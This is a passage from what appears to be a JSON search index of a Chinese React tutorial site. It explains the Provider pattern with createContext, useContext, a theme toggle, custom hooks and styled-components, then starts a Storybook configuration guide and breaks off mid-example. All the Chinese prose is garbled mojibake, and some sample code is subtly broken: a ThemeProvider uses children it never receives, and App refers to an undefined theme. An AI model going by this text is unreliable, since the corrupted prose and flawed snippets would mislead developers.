é€’ç»™è¿™äº›ç»„ä»¶ï¼Œæˆ‘ä»¬å¿…é¡»é€šè¿‡å¤šå±‚ç»„ä»¶ä¼ é€’å®ƒã€‚\nåœ¨æˆ‘ä»¬çš„ä»£ç åº“ä¸­ï¼Œè¿™å°†ç±»ä¼¼äºä»¥ä¸‹å†…å®¹ï¼š\nfunction App() {\rconst data = { ... }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;SideBar data={data} /\u0026gt;\r\u0026lt;Content data={data} /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rconst SideBar = ({ data }) =\u0026gt; \u0026lt;List data={data} /\u0026gt;\rconst List = ({ data }) =\u0026gt; \u0026lt;ListItem data={data} /\u0026gt;\rconst ListItem = ({ data }) =\u0026gt; \u0026lt;span\u0026gt;{data.listItem}\u0026lt;/span\u0026gt;\rconst Content = ({ data }) =\u0026gt; (\r\u0026lt;div\u0026gt;\r\u0026lt;Header data={data} /\u0026gt;\r\u0026lt;Block data={data} /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\rconst Header = ({ data }) =\u0026gt; \u0026lt;div\u0026gt;{data.title}\u0026lt;/div\u0026gt;\rconst Block = ({ data }) =\u0026gt; \u0026lt;Text data={data} /\u0026gt;\rconst Text = ({ data }) =\u0026gt; \u0026lt;h1\u0026gt;{data.text}\u0026lt;/h1\u0026gt; ä»¥è¿™ç§æ–¹å¼ä¼ é€’é“å…·ä¼šå˜å¾—éå¸¸æ··ä¹±ã€‚å¦‚æœæˆ‘ä»¬æƒ³åœ¨æœªæ¥é‡å‘½å data propï¼Œæˆ‘ä»¬å¿…é¡»åœ¨æ‰€æœ‰ç»„ä»¶ä¸­é‡å‘½åå®ƒã€‚æ‚¨çš„åº”ç”¨ç¨‹åºè¶Šå¤§ï¼Œé“å…·é’»å­”å°±è¶Šæ£˜æ‰‹ã€‚\næˆ‘ä»¬æœ€å¥½å¯ä»¥è·³è¿‡ä¸éœ€è¦ä½¿ç”¨è¿™äº›æ•°æ®çš„æ‰€æœ‰ç»„ä»¶å±‚ã€‚æˆ‘ä»¬éœ€è¦ä¸€äº›ä¸œè¥¿ï¼Œè®©éœ€è¦è®¿é—®æ•°æ®å€¼çš„ç»„ä»¶ç›´æ¥è®¿é—®å®ƒï¼Œè€Œä¸ä¾èµ–äºé“å…·é’»å–ã€‚\n\rProvider æä¾›è€… è¿™å°±æ˜¯æä¾›è€… Provider æ¨¡å¼å¯ä»¥å¸®åŠ©æˆ‘ä»¬çš„åœ°æ–¹ï¼ä½¿ç”¨æä¾›è€…æ¨¡å¼ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿æ•°æ®å¯ä¾›å¤šä¸ªç»„ä»¶ä½¿ç”¨ã€‚\næˆ‘ä»¬å¯ä»¥å°†æ‰€æœ‰ç»„ä»¶åŒ…è£…åœ¨ä¸€ä¸ª Provider ä¸­ï¼Œè€Œä¸æ˜¯é€šè¿‡ props å°†æ•°æ®å‘ä¸‹ä¼ é€’åˆ°æ¯ä¸€å±‚ã€‚\nProvider æ˜¯ä¸€ä¸ªç”± Context å¯¹è±¡æä¾›ç»™æˆ‘ä»¬çš„é«˜é˜¶ç»„ä»¶ã€‚\næˆ‘ä»¬å¯ä»¥ä½¿ç”¨ React ä¸ºæˆ‘ä»¬æä¾›çš„ createContext æ–¹æ³•åˆ›å»ºä¸€ä¸ª Context å¯¹è±¡ã€‚\nProvider æ¥æ”¶ä¸€ä¸ª value propï¼Œå…¶ä¸­åŒ…å«æˆ‘ä»¬æƒ³è¦ä¼ é€’çš„æ•°æ®ã€‚åŒ…è£…åœ¨æ­¤ Provider ä¸­çš„æ‰€æœ‰ç»„ä»¶éƒ½å¯ä»¥è®¿é—® value å±æ€§çš„å€¼ã€‚\nconst DataContext = React.createContext()\rfunction App() {\rconst data = { ... }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;DataContext.Provider value={data}\u0026gt;\r\u0026lt;SideBar /\u0026gt;\r\u0026lt;Content /\u0026gt;\r\u0026lt;/DataContext.Provider\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r} æˆ‘ä»¬ä¸å†éœ€è¦æ‰‹åŠ¨å°†æ•°æ®å±æ€§ä¼ é€’ç»™æ¯ä¸ªç»„ä»¶ï¼ é‚£ä¹ˆï¼ŒListItemã€Headerã€Text ç»„ä»¶å¦‚ä½•è®¿é—®æ•°æ®çš„å€¼å‘¢ï¼Ÿ\næ¯ä¸ªç»„ä»¶éƒ½å¯ä»¥é€šè¿‡ä½¿ç”¨ useContext é’©å­æ¥è®¿é—®æ•°æ®ã€‚ è¿™ä¸ªé’©å­æ¥æ”¶æ•°æ®å¼•ç”¨çš„ä¸Šä¸‹æ–‡ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹æ˜¯ DataContext ã€‚ useContext é’©å­è®©æˆ‘ä»¬å¯ä»¥è¯»å–å’Œå†™å…¥æ•°æ®åˆ°ä¸Šä¸‹æ–‡å¯¹è±¡ã€‚\nconst DataContext = React.createContext();\rfunction App() {\rconst data = { ... }\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;SideBar /\u0026gt;\r\u0026lt;Content /\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\rconst SideBar = () =\u0026gt; \u0026lt;List /\u0026gt;\rconst List = () =\u0026gt; \u0026lt;ListItem /\u0026gt;\rconst Content = () =\u0026gt; \u0026lt;div\u0026gt;\u0026lt;Header /\u0026gt;\u0026lt;Block /\u0026gt;\u0026lt;/div\u0026gt;\rfunction ListItem() {\rconst { data } = React.useContext(DataContext);\rreturn \u0026lt;span\u0026gt;{data.listItem}\u0026lt;/span\u0026gt;;\r}\rfunction Text() {\rconst { data } = React.useContext(DataContext);\rreturn \u0026lt;h1\u0026gt;{data.text}\u0026lt;/h1\u0026gt;;\r}\rfunction Header() {\rconst { data } = React.useContext(DataContext);\rreturn \u0026lt;div\u0026gt;{data.title}\u0026lt;/div\u0026gt;;\r} ä¸ä½¿ç”¨æ•°æ®å€¼çš„ç»„ä»¶æ ¹æœ¬ä¸å¿…å¤„ç†æ•°æ®ã€‚ æˆ‘ä»¬ä¸å†éœ€è¦æ‹…å¿ƒé€šè¿‡ä¸éœ€è¦ props å€¼çš„ç»„ä»¶å°† props å‘ä¸‹ä¼ é€’å‡ ä¸ªçº§åˆ«ï¼Œè¿™ä½¿å¾—é‡æ„æ›´å®¹æ˜“ã€‚\n\rä¸»é¢˜ Theme UI Provider æ¨¡å¼å¯¹äºå…±äº«å…¨å±€æ•°æ®éå¸¸æœ‰ç”¨ã€‚ æä¾›è€…æ¨¡å¼çš„ä¸€ä¸ªå¸¸è§ç”¨ä¾‹æ˜¯ä¸è®¸å¤šç»„ä»¶å…±äº«ä¸€ä¸ªä¸»é¢˜ UI çŠ¶æ€ã€‚\nå‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ˜¾ç¤ºåˆ—è¡¨çš„ç®€å•åº”ç”¨ç¨‹åºã€‚\næˆ‘ä»¬å¸Œæœ›ç”¨æˆ·èƒ½å¤Ÿé€šè¿‡åˆ‡æ¢å¼€å…³åœ¨äº®æ¨¡å¼å’Œæš—æ¨¡å¼ä¹‹é—´åˆ‡æ¢ã€‚ å½“ç”¨æˆ·ä»æš—æ¨¡å¼åˆ‡æ¢åˆ°äº®æ¨¡å¼ï¼ˆåä¹‹äº¦ç„¶ï¼‰æ—¶ï¼ŒèƒŒæ™¯é¢œè‰²å’Œæ–‡æœ¬é¢œè‰²åº”è¯¥æ”¹å˜ï¼\næˆ‘ä»¬å¯ä»¥å°†ç»„ä»¶åŒ…è£…åœ¨ ThemeProvider ä¸­ï¼Œå¹¶å°†å½“å‰ä¸»é¢˜é¢œè‰²ä¼ é€’ç»™æä¾›ç¨‹åºï¼Œè€Œä¸æ˜¯å°†å½“å‰ä¸»é¢˜å€¼å‘ä¸‹ä¼ é€’ç»™æ¯ä¸ªç»„ä»¶ã€‚\nexport const ThemeContext = React.createContext();\rconst themes = {\rlight: {\rbackground: \u0026#34;#fff\u0026#34;,\rcolor: \u0026#34;#000\u0026#34;\r},\rdark: {\rbackground: \u0026#34;#171717\u0026#34;,\rcolor: \u0026#34;#fff\u0026#34;\r}\r};\rexport default function App() {\rconst [theme, setTheme] = useState(\u0026#34;dark\u0026#34;);\rfunction toggleTheme() {\rsetTheme(theme === \u0026#34;light\u0026#34; ? \u0026#34;dark\u0026#34; : \u0026#34;light\u0026#34;);\r}\rconst providerValue = {\rtheme: themes[theme],\rtoggleTheme\r};\rreturn (\r\u0026lt;div className={`App theme-${theme}`}\u0026gt;\r\u0026lt;ThemeContext.Provider value={providerValue}\u0026gt;\r\u0026lt;Toggle /\u0026gt;\r\u0026lt;List /\u0026gt;\r\u0026lt;/ThemeContext.Provider\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} ç”±äº Toggle å’Œ List ç»„ä»¶éƒ½åŒ…å«åœ¨ ThemeContext æä¾›ç¨‹åºä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—®ä½œä¸ºå€¼ä¼ é€’ç»™æä¾›è€…çš„å€¼ theme å’Œ toggleTheme ã€‚\nåœ¨ Toggle ç»„ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ toggleTheme å‡½æ•°ç›¸åº”åœ°æ›´æ–°ä¸»é¢˜ã€‚\nimport React, { useContext } from \u0026#34;react\u0026#34;;\rimport { ThemeContext } from \u0026#34;./App\u0026#34;;\rexport default function Toggle() {\rconst theme = useContext(ThemeContext);\rreturn (\r\u0026lt;label className=\u0026#34;switch\u0026#34;\u0026gt;\r\u0026lt;input type=\u0026#34;checkbox\u0026#34; onClick={theme.toggleTheme} /\u0026gt;\r\u0026lt;span className=\u0026#34;slider round\u0026#34; /\u0026gt;\r\u0026lt;/label\u0026gt;\r);\r} List ç»„ä»¶æœ¬èº«å¹¶ä¸å…³å¿ƒä¸»é¢˜çš„å½“å‰å€¼ã€‚ ä½†æ˜¯ï¼ŒListItem ç»„ä»¶éœ€è¦ï¼ æˆ‘ä»¬å¯ä»¥ç›´æ¥åœ¨ ListItem ä¸­ä½¿ç”¨ä¸»é¢˜ä¸Šä¸‹æ–‡ã€‚\nimport React, { useContext } from \u0026#34;react\u0026#34;;\rimport { ThemeContext } from \u0026#34;./App\u0026#34;;\rexport default function TextBox() {\rconst theme = useContext(ThemeContext);\rreturn \u0026lt;li style={theme.theme}\u0026gt;...\u0026lt;/li\u0026gt;;\r} Perfect! æˆ‘ä»¬ä¸å¿…å°†ä»»ä½•æ•°æ®ä¼ é€’ç»™ä¸å…³å¿ƒä¸»é¢˜å½“å‰å€¼çš„ç»„ä»¶ã€‚\n\rHooks æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ªé’©å­æ¥ä¸ºç»„ä»¶æä¾›ä¸Šä¸‹æ–‡ã€‚ ä¸å¿…åœ¨æ¯ä¸ªç»„ä»¶ä¸­å¯¼å…¥ useContext å’Œ Contextï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€ä¸ªé’©å­æ¥è¿”å›æˆ‘ä»¬éœ€è¦çš„ä¸Šä¸‹æ–‡ã€‚\nfunction useThemeContext() {\rconst theme = useContext(ThemeContext);\rreturn theme;\r} ä¸ºäº†ç¡®ä¿å®ƒæ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ä¸»é¢˜ï¼Œè®©æˆ‘ä»¬åœ¨ useContext(ThemeContext) è¿”å›ä¸€ä¸ªè™šå‡å€¼æ—¶æŠ›å‡ºä¸€ä¸ªé”™è¯¯ã€‚\n1 2 3 4 5 6 7 8  function useThemeContext() { const theme = useContext(ThemeContext); if (!theme) { throw new Error(\u0026#34;useThemeContext å¿…é¡»åœ¨ ThemeProvider ä¸­ä½¿ç”¨\u0026#34;); } return theme; }   æˆ‘ä»¬å¯ä»¥åˆ›å»ºä¸€ä¸ª HOCï¼Œä½¿ç”¨æä¾›çš„å€¼æ·»åŠ è¿”å›æ­¤ç»„ä»¶ï¼Œè€Œä¸æ˜¯ç›´æ¥ä½¿ç”¨ ThemeContext.Provider ç»„ä»¶åŒ…è£…ç»„ä»¶ã€‚ é€šè¿‡è¿™ç§æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä¸Šä¸‹æ–‡é€»è¾‘ä¸æ¸²æŸ“ç»„ä»¶åˆ†ç¦»ï¼Œä»è€Œæé«˜æä¾›ç¨‹åºçš„å¯é‡ç”¨æ€§ã€‚\nfunction ThemeProvider() {\rconst [theme, setTheme] = useState(\u0026#34;dark\u0026#34;);\rfunction toggleTheme() {\rsetTheme(theme === \u0026#34;light\u0026#34; ? \u0026#34;dark\u0026#34; : \u0026#34;light\u0026#34;);\r}\rconst providerValue = {\rtheme: themes[theme],\rtoggleTheme\r};\rreturn (\r\u0026lt;ThemeContext.Provider value={providerValue}\u0026gt;\r{children}\r\u0026lt;/ThemeContext.Provider\u0026gt;\r);\r}\rexport default function App() {\rreturn (\r\u0026lt;div className={`App theme-${theme}`}\u0026gt;\r\u0026lt;ThemeProvider\u0026gt;\r\u0026lt;Toggle /\u0026gt;\r\u0026lt;List /\u0026gt;\r\u0026lt;/ThemeProvider\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} æ¯ä¸ªéœ€è¦è®¿é—® ThemeContext çš„ç»„ä»¶ç°åœ¨å¯ä»¥ç®€å•åœ°ä½¿ç”¨ useThemeContext é’©å­ã€‚\nexport default function TextBox() {\rconst theme = useThemeContext();\rreturn \u0026lt;li style={theme.theme}\u0026gt;...\u0026lt;/li\u0026gt;;\r} é€šè¿‡ä¸ºä¸åŒçš„ä¸Šä¸‹æ–‡åˆ›å»ºé’©å­ï¼Œå¾ˆå®¹æ˜“å°†æä¾›è€…çš„é€»è¾‘ä¸å‘ˆç°æ•°æ®çš„ç»„ä»¶åˆ†å¼€ã€‚\n\ræ¡ˆä¾‹åˆ†æ ä¸€äº›åº“æä¾›äº†å†…ç½®çš„æä¾›è€…ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨æ¶ˆè´¹ç»„ä»¶ä¸­ä½¿ç”¨è¿™äº›å€¼ã€‚ ä¸€ä¸ªå¾ˆå¥½çš„ä¾‹å­å°±æ˜¯æ ·å¼ç»„ä»¶ã€‚\nç†è§£è¿™ä¸ªä¾‹å­ä¸éœ€è¦ä»»ä½•æ ·å¼ç»„ä»¶çš„ç»éªŒã€‚\nstyled-components åº“ä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ª ThemeProviderã€‚ æ¯ä¸ªæ ·å¼ç»„ä»¶éƒ½å¯ä»¥è®¿é—®æ­¤æä¾›ç¨‹åºçš„å€¼ï¼ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æä¾›ç»™æˆ‘ä»¬çš„ APIï¼Œè€Œä¸æ˜¯è‡ªå·±åˆ›å»ºä¸Šä¸‹æ–‡ APIï¼\nè®©æˆ‘ä»¬ä½¿ç”¨ç›¸åŒçš„ List ç¤ºä¾‹ï¼Œå¹¶å°†ç»„ä»¶åŒ…è£…åœ¨ä»æ ·å¼ç»„ä»¶åº“å¯¼å…¥çš„ ThemeProvider ä¸­ã€‚\nimport { ThemeProvider } from \u0026#34;styled-components\u0026#34;;\rexport default function App() {\rconst [theme, setTheme] = useState(\u0026#34;dark\u0026#34;);\rfunction toggleTheme() {\rsetTheme(theme === \u0026#34;light\u0026#34; ? \u0026#34;dark\u0026#34; : \u0026#34;light\u0026#34;);\r}\rreturn (\r\u0026lt;div className={`App theme-${theme}`}\u0026gt;\r\u0026lt;ThemeProvider theme={themes[theme]}\u0026gt;\r\u0026lt;\u0026gt;\r\u0026lt;Toggle toggleTheme={toggleTheme} /\u0026gt;\r\u0026lt;List /\u0026gt;\r\u0026lt;/\u0026gt;\r\u0026lt;/ThemeProvider\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r} æˆ‘ä»¬ä¸ä¼šå°†å†…è”æ ·å¼é“å…·ä¼ é€’ç»™ ListItem ç»„ä»¶ï¼Œè€Œæ˜¯å°†å…¶è®¾ä¸º styled.li ç»„ä»¶ã€‚ ç”±äºå®ƒæ˜¯ä¸€ä¸ªæ ·å¼ç»„ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥è®¿é—® theme çš„å€¼ï¼\nimport styled from \u0026#34;styled-components\u0026#34;;\rexport default function ListItem() {\rreturn (\r\u0026lt;Li\u0026gt;\rLorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod\rtempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim\rveniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea\rcommodo consequat.\r\u0026lt;/Li\u0026gt;\r);\r}\rconst Li = styled.li`\r${({ theme }) =\u0026gt; `\rbackground-color: ${theme.backgroundColor};\rcolor: ${theme.color};\r`}\r`; å¤ªæ£’äº†ï¼Œæˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨ ThemeProvider è½»æ¾åœ°å°†æ ·å¼åº”ç”¨äºæˆ‘ä»¬æ‰€æœ‰çš„æ ·å¼ç»„ä»¶ï¼\n\rä¼˜ç‚¹ æä¾›è€…æ¨¡å¼/ä¸Šä¸‹æ–‡ API å¯ä»¥å°†æ•°æ®ä¼ é€’ç»™è®¸å¤šç»„ä»¶ï¼Œè€Œæ— éœ€æ‰‹åŠ¨å°†å…¶ä¼ é€’åˆ°æ¯ä¸ªç»„ä»¶å±‚ã€‚\nå®ƒé™ä½äº†é‡æ„ä»£ç æ—¶æ„å¤–å¼•å…¥é”™è¯¯çš„é£é™©ã€‚ ä»¥å‰ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é‡å‘½åä¸€ä¸ª propï¼Œæˆ‘ä»¬å¿…é¡»åœ¨ä½¿ç”¨è¯¥å€¼çš„æ•´ä¸ªåº”ç”¨ç¨‹åºä¸­é‡å‘½åè¯¥ propã€‚\næˆ‘ä»¬ä¸å†éœ€è¦å¤„ç†å¯è¢«è§†ä¸ºåæ¨¡å¼çš„èºæ—‹é’»ã€‚ ä»¥å‰ï¼Œå¯èƒ½å¾ˆéš¾ç†è§£åº”ç”¨ç¨‹åºçš„æ•°æ®æµï¼Œå› ä¸ºå¹¶ä¸æ€»æ˜¯æ¸…æ¥šæŸäº› prop å€¼çš„æ¥æºã€‚ ä½¿ç”¨ Provider æ¨¡å¼ï¼Œæˆ‘ä»¬ä¸å†éœ€è¦ä¸å¿…è¦åœ°å°† props ä¼ é€’ç»™ä¸å…³å¿ƒè¿™äº›æ•°æ®çš„ç»„ä»¶ã€‚\nä½¿ç”¨ Provider æ¨¡å¼å¯ä»¥è½»æ¾ä¿æŒæŸç§å…¨å±€çŠ¶æ€ï¼Œå› ä¸ºæˆ‘ä»¬å¯ä»¥è®©ç»„ä»¶è®¿é—®æ­¤å…¨å±€çŠ¶æ€ã€‚\n\rç¼ºç‚¹ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿‡åº¦ä½¿ç”¨æä¾›è€…æ¨¡å¼ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚ ä½¿ç”¨ä¸Šä¸‹æ–‡çš„æ‰€æœ‰ç»„ä»¶åœ¨æ¯æ¬¡çŠ¶æ€æ›´æ”¹æ—¶éƒ½ä¼šé‡æ–°æ¸²æŸ“ã€‚\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ã€‚ æˆ‘ä»¬æœ‰ä¸€ä¸ªç®€å•çš„è®¡æ•°å™¨ï¼Œæ¯æ¬¡å•å‡» Button ç»„ä»¶ä¸­çš„ Increment æŒ‰é’®æ—¶ï¼Œè¯¥è®¡æ•°å™¨çš„å€¼éƒ½ä¼šå¢åŠ ã€‚ æˆ‘ä»¬åœ¨é‡ç½®ç»„ä»¶ä¸­è¿˜æœ‰ä¸€ä¸ªé‡ç½®æŒ‰é’®ï¼Œå®ƒå°†è®¡æ•°é‡ç½®ä¸º 0ã€‚\nä½†æ˜¯ï¼Œå½“æ‚¨å•å‡» Increment æ—¶ï¼Œæ‚¨ä¼šçœ‹åˆ°é‡æ–°æ¸²æŸ“çš„ä¸ä»…ä»…æ˜¯è®¡æ•°ã€‚ é‡ç½®ç»„ä»¶ä¸­çš„æ—¥æœŸä¹Ÿä¼šé‡æ–°å‘ˆç°ï¼\nReset ç»„ä»¶ä¹Ÿé‡æ–°æ¸²æŸ“ï¼Œå› ä¸ºå®ƒæ¶ˆè´¹äº† useCountContextã€‚ åœ¨è¾ƒå°çš„åº”ç”¨ç¨‹åºä¸­ï¼Œè¿™ä¸ä¼šå¤ªé‡è¦ã€‚ åœ¨è¾ƒå¤§çš„åº”ç”¨ç¨‹åºä¸­ï¼Œå°†é¢‘ç¹æ›´æ–°çš„å€¼ä¼ é€’ç»™è®¸å¤šç»„ä»¶ä¼šå¯¹æ€§èƒ½äº§ç”Ÿè´Ÿé¢å½±å“ã€‚\nä¸ºç¡®ä¿ç»„ä»¶ä¸ä½¿ç”¨åŒ…å«å¯èƒ½æ›´æ–°çš„ä¸å¿…è¦å€¼çš„æä¾›ç¨‹åºï¼Œæ‚¨å¯ä»¥ä¸ºæ¯ä¸ªå•ç‹¬çš„ç”¨ä¾‹åˆ›å»ºå¤šä¸ªæä¾›ç¨‹åºã€‚\n\rçŸ¥è¯†ç‚¹  React.createContext() Provider useContext  ","description":"ä½¿æ•°æ®å¯ç”¨äºå¤šä¸ªå­ç»„ä»¶","id":81,"section":"react-patterns","tags":null,"title":"æä¾›è€…æ¨¡å¼","uri":"https://codthing.github.io/react-patterns/design-patterns/provider-pattern/"},{"content":"ç¼–å†™ Story ä»é¡¹ç›®ä¸­é€‰æ‹©ä¸€ä¸ªç®€å•çš„ç»„ä»¶ï¼Œæ¯”å¦‚ä¸€ä¸ª Buttonï¼Œç„¶åç¼–å†™ä¸€ä¸ª .stories.ts æˆ–ä¸€ä¸ª .stories.mdx æ–‡ä»¶æ¥é…åˆå®ƒã€‚\nå®ƒå¯èƒ½çœ‹èµ·æ¥åƒè¿™æ ·ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // YourComponent.stories.ts|tsx  import React from \u0026#39;react\u0026#39;; import { ComponentStory, ComponentMeta } from \u0026#39;@storybook/react\u0026#39;; import { YourComponent } from \u0026#39;./YourComponent\u0026#39;; //ğŸ‘‡ æ­¤é»˜è®¤å¯¼å‡ºå†³å®šæ‚¨çš„æ•…äº‹åœ¨æ•…äº‹åˆ—è¡¨ä¸­çš„ä½ç½® export default { title: \u0026#39;YourComponent\u0026#39;, component: YourComponent, } as ComponentMeta\u0026lt;typeof YourComponent\u0026gt;; //ğŸ‘‡ args å¦‚ä½•æ˜ å°„åˆ°æ¸²æŸ“çš„ template const Template: ComponentStory\u0026lt;typeof YourComponent\u0026gt; = (args) =\u0026gt; \u0026lt;YourComponent {...args} /\u0026gt;; export const FirstStory = Template.bind({}); FirstStory.args = { /*ğŸ‘‡ æ­¤å¤„çš„å‚æ•°å–å†³äºç»„ä»¶ */ };   ç¼–å†™æ–‡æ¡£ï¼ˆå¯é€‰ï¼‰\n\u0026lt;!-- YourComponent.stories.mdx --\u0026gt;\rimport { Meta, Story } from \u0026#39;@storybook/addon-docs\u0026#39;;\rimport { YourComponent } from \u0026#39;./YourComponent\u0026#39;;\r\u0026lt;!--ğŸ‘‡ æ ‡é¢˜ prop å†³å®šäº†æ•…äº‹åœ¨æ•…äº‹åˆ—è¡¨ä¸­çš„ä½ç½® --\u0026gt;\r\u0026lt;Meta title=\u0026#34;YourComponent\u0026#34; component={YourComponent} /\u0026gt;\r\u0026lt;!--ğŸ‘‡ args å¦‚ä½•æ˜ å°„åˆ°æ¸²æŸ“çš„ template --\u0026gt;\rexport const Template = (args) =\u0026gt; \u0026lt;YourComponent {...args} /\u0026gt;;\r\u0026lt;!-- ğŸ‘‡ æ­¤å¤„çš„å‚æ•°å–å†³äºç»„ä»¶ --\u0026gt;\r\u0026lt;Story\rname=\u0026#34;FirstStory\u0026#34;\rargs={{}}\u0026gt;\r{Template.bind({})}\r\u0026lt;/Story\u0026gt; è½¬åˆ° Storybook ä»¥æŸ¥çœ‹å‘ˆç°çš„ç»„ä»¶ã€‚ å¦‚æœç°åœ¨çœ‹èµ·æ¥æœ‰ç‚¹ä¸å¯»å¸¸ä¹Ÿæ²¡å…³ç³»ã€‚\næ ¹æ®æŠ€æœ¯å †æ ˆï¼Œå¯èƒ½è¿˜éœ€è¦è¿›ä¸€æ­¥é…ç½® Storybook ç¯å¢ƒã€‚\n\rä¸ºå †æ ˆé…ç½® Storybook Storybook å¸¦æœ‰ä¸€ä¸ªå®½æ¾çš„é»˜è®¤é…ç½®ã€‚ å®ƒå°è¯•è‡ªå®šä¹‰è‡ªå·±ä»¥é€‚åˆæ‚¨çš„è®¾ç½®ã€‚ ä½†è¿™å¹¶éä¸‡æ— ä¸€å¤±ã€‚\nåœ¨å•ç‹¬å‘ˆç°ç»„ä»¶ä¹‹å‰ï¼Œé¡¹ç›®å¯èƒ½æœ‰å…¶ä»–è¦æ±‚ã€‚ è¿™éœ€è¦è¿›ä¸€æ­¥å®šåˆ¶é…ç½®ã€‚ æ‚¨å¯èƒ½éœ€è¦ä¸‰å¤§ç±»é…ç½®ã€‚\n1. åƒ webpack å’Œ Babel ä¸€æ ·æ„å»ºé…ç½® å¦‚æœåœ¨è¿è¡Œ yarn storybook å‘½ä»¤æ—¶åœ¨ CLI ä¸Šçœ‹åˆ°é”™è¯¯ï¼Œåˆ™å¯èƒ½éœ€è¦æ›´æ”¹ Storybook çš„æ„å»ºé…ç½®ã€‚ ä»¥ä¸‹æ˜¯ä¸€äº›å¯ä»¥å°è¯•çš„äº‹æƒ…ï¼š\n  Presets å°†å„ç§æŠ€æœ¯çš„é€šç”¨é…ç½®æ†ç»‘åˆ° Storybook ä¸­ã€‚ ç‰¹åˆ«æ˜¯ Create React Appã€SCSS å’Œ Ant Design çš„é¢„è®¾ã€‚\n  ä¸º Storybook æŒ‡å®šè‡ªå®šä¹‰ Babel é…ç½®ã€‚ å¦‚æœå¯ä»¥ï¼ŒStorybook ä¼šè‡ªåŠ¨å°è¯•ä½¿ç”¨æ‚¨é¡¹ç›®çš„é…ç½®ã€‚\n  è°ƒæ•´ Storybook ä½¿ç”¨çš„ webpack é…ç½®ã€‚ å¦‚æœéœ€è¦ï¼Œè¯·å°è¯•åœ¨è‡ªå·±çš„é…ç½®ä¸­æ‰“è¡¥ä¸ã€‚\n  2. è¿è¡Œæ—¶é…ç½® å¦‚æœ Storybook å·²æ„å»ºï¼Œä½†æµè§ˆå™¨è¿æ¥åˆ°å®ƒæ—¶ç«‹å³çœ‹åˆ°é”™è¯¯ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¾ˆå¯èƒ½è¾“å…¥æ–‡ä»¶ä¹‹ä¸€æœªæ­£ç¡®ç¼–è¯‘/è½¬è¯‘ä»¥ä¾›æµè§ˆå™¨è§£é‡Šã€‚ Storybook æ”¯æŒç°ä»£æµè§ˆå™¨å’Œ IE11ï¼Œä½†å¯èƒ½éœ€è¦æ£€æŸ¥ Babel å’Œ webpack è®¾ç½®ï¼ˆè§ä¸Šæ–‡ï¼‰ä»¥ç¡®ä¿ç»„ä»¶ä»£ç æ­£å¸¸å·¥ä½œã€‚\n3. Component context å¦‚æœæŸä¸ªç‰¹å®šçš„æ•…äº‹åœ¨æ¸²æŸ“æ—¶å‡ºç°é—®é¢˜ï¼Œé€šå¸¸æ„å‘³ç€ç»„ä»¶å¸Œæœ›è¯¥ç»„ä»¶å¯ä»¥ä½¿ç”¨ç‰¹å®šçš„ç¯å¢ƒã€‚\nä¸€ä¸ªå¸¸è§çš„å‰ç«¯æ¨¡å¼æ˜¯è®©ç»„ä»¶å‡è®¾å®ƒä»¬åœ¨ç‰¹å®šçš„â€œä¸Šä¸‹æ–‡â€ä¸­æ¸²æŸ“ï¼Œçˆ¶ç»„ä»¶åœ¨æ¸²æŸ“å±‚æ¬¡ç»“æ„ä¸­æ›´é«˜ï¼ˆä¾‹å¦‚ï¼Œä¸»é¢˜æä¾›è€…ï¼‰ã€‚\nä½¿ç”¨ Decorators è£…é¥°å™¨ å°†æ¯ä¸ªæ•…äº‹â€œåŒ…è£…â€åœ¨å¿…è¦çš„ä¸Šä¸‹æ–‡æä¾›è€…ä¸­ã€‚ .storybook/preview.js æ–‡ä»¶å…è®¸è‡ªå®šä¹‰ç»„ä»¶åœ¨ Canvasï¼ˆé¢„è§ˆ iframeï¼‰ä¸­çš„å‘ˆç°æ–¹å¼ã€‚ åœ¨ä¸‹é¢çš„ç¤ºä¾‹ä¸­ï¼Œäº†è§£å¦‚ä½•ä½¿ç”¨ Styled Components ThemeProvider ä¸»é¢˜æä¾›ç¨‹åºç»„ä»¶æ¥åŒ…è£… Storybook ä¸­å‘ˆç°çš„æ¯ä¸ªç»„ä»¶ã€‚\nReact:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // .storybook/preview.ts  import React from \u0026#39;react\u0026#39;; import { ThemeProvider } from \u0026#39;styled-components\u0026#39;; export const decorators = [ (Story) =\u0026gt; ( \u0026lt;ThemeProvider theme=\u0026#34;default\u0026#34;\u0026gt; \u0026lt;Story /\u0026gt; \u0026lt;/ThemeProvider\u0026gt; ), ];   React(STORY-FUNCTION):\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  // .storybook/preview.ts  import React from \u0026#39;react\u0026#39;; import { ThemeProvider } from \u0026#39;styled-components\u0026#39;; export const decorators = [ (Story) =\u0026gt; ( \u0026lt;ThemeProvider 